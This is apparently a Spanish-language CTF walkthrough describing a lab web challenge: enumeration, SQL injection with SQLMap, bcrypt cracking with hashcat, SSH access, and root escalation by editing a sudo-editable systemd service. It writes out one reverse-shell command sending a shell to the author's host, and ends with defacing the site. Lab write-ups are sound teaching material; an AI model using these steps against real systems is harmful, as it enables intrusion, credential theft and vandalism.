---
layout: apunte
title: "3. Finding the flags"
---

1. Vamos a la página que nos dan.
   !**Pasted image 20251120201019.png**
   Una vez allí investigamos las páginas y encontramos algunas:
	- Home
	- Products
	- Contact
	- Login
2. Pero como somos gente curiosa no nos quedamos ahí y vamos a hacer un escaneo más profundo con nuestra herramienta de elección. En mi caso voy a usar `gobuster`.
   !**Pasted image 20251120203103.png**
   Hemos encontrado dos directorios que no aparecían directamente en la web, aunque el directorio `/static` parece estas en estado `403 Forbbiden`.
3. Comprobamos lo que hay en `/admin`.
   !**Pasted image 20251120223956.png**
   Parece que hemos encontrado el login del administrador, pero no tenemos credenciales (todavía).
4. Vamos a hacer un nmap, no sea que estemos pasando algo por alto.
   !**Pasted image 20251120231017.png**
   Parece que está abierto el puerto SSH, hmmm...
5. Volvamos a investigar el resto de las páginas. No vemos nada interesante (más allá de la página de login normal, pero nosotros ya tenemos la del admin) hasta que llegamos a la página `/products`.
   !**Pasted image 20251120224808.png**
6. Si hacemos click en alguno de los productos, vemos que en la URL aparece un número (que pareciera ser el ID del producto en cuestión).
   !**Pasted image 20251120224916.png**
7. Si probamos a cambiar ese número por uno que no exista, como `0`, vemos que el servidor no responde con un `404 Not Found`, sino con un `500 Internal Server Error`, por lo que sabemos que esos números no son páginas html sino en efecto IDs que se están comprobando en una base de datos.
   !**Pasted image 20251120225058.png**
8. Vamos a probar la herramienta `SQLMap` con esta URL.
   !**Pasted image 20251120225313.png**
9. Después de esperar un poco, obtenemos las bases de datos:
   !**Pasted image 20251120225351.png**
10. Ahora sólo queda ir abriéndonos paso hasta dar con las credenciales de un administrador.
	1. Primero sacamos las tablas.
	   !**Pasted image 20251120225513.png**
	2. Luego dumpeamos la tabla que nos interesa (en nuestro caso los usuarios más interesantes estarán en `system_user`).
	   !**Pasted image 20251120225641.png**
	   ¡Vaya! Parece que están hasheadas. Bueno, eso no va a ser un impedimento para nosotros.
11. Antes de continuar vamos a ver que hay en la tabla users también.
    !**Pasted image 20251120231302.png**
    Vaya vaya, parece que aquí tenemos nuestra **primera flag**.
12. Cogemos la contraseña hasheada del administrador. Por el comienzo sabemos que es un bcrypt. Vamos a descifrarla.
	1. Buscamos el tipo de hash. Y metemos el nuestro en un archivo.
	   !**Pasted image 20251120230437.png**
	2. Lo deshasheamos con la herramienta `hashcat`.
	   !**Pasted image 20251120230358.png**
13. Vamos a loguearnos. Pero lo vamos a hacer por SSH en el servidor, ya que no tiene mucho sentido hacerlo en la página, cuando lo que queremos es hacerle un deface a la página.
    !**Pasted image 20251120231510.png**
    Estamos dentro, veamos qué hay por aquí.
14. Hacemos un `ls` y ¡sorpresa!
    !**Pasted image 20251120231559.png**
15. Sólo nos queda hacer el deface. Pero antes vamos a mirar que hay en `/root`, ¿no? Por curiosidad.
    !**Pasted image 20251120231735.png**
    Vaya, parece que nos hemos encontrado un problema, tendremos que escalar privilegios.
16. Veamos qué comandos podemos ejecutar: con `sudo -l`.
    !**Pasted image 20251120231903.png**
    Parece que podemos jugar con un permiso como root... ¡y encima podemos editarlo! Ya está, el cóctel perfecto.
17. Vamos a editar dicho servicio. Como sabemos que lo ejecuta el sistema (es decir que tiene permisos de administrador) vamos a intentar mandarnos una reverse shell.
	1. Vamos a la página de [Shell Generator](www.revshells.com) y buscamos una que nos guste.
	   !**Pasted image 20251120232159.png**
	2. Nos ponemos en escucha.
	   !**Pasted image 20251120232228.png**
	3. Editamos el servicio para que ejecute el siguiente comando: `sh -i >& /dev/tcp/192.168.129.186/9000 0>&1`, el cual nos mandará una reverse shell.
	   !**Pasted image 20251120232512.png**
	   !**Pasted image 20251120232530.png**
	4. Debemos editar el ExecStart y el usuario que lo ejecuta.
	   !**Pasted image 20251120233209.png**
18. Hacemos un reload del daemon seguido de un restart del servicio, que eran dos comandos a los que también teníamos acceso.
    !**Pasted image 20251120233100.png**
19. Y tal cual acabamos de conseguir ser root.
    !**Pasted image 20251120233304.png**
20. Ahora sí vamos a mirar qué hay en `/root` seguro que está la flag.
    !**Pasted image 20251120233351.png**
    Pues no xD
21. Bueno, vamos a hacer lo que nos pedía el reto, hacerle un defacement a la página principal.
    !**Pasted image 20251120233541.png**
    Como estoy de mal humor porque no he visto la flag todavia mando la página principal a la mierda >:(
22. A ver si ahora ya está la flag por algún sitio.
    !**Pasted image 20251120233823.png**


>[!SUCCESS] UEEEEE! Hemos encontrado las 3 flags. 

pwned by xut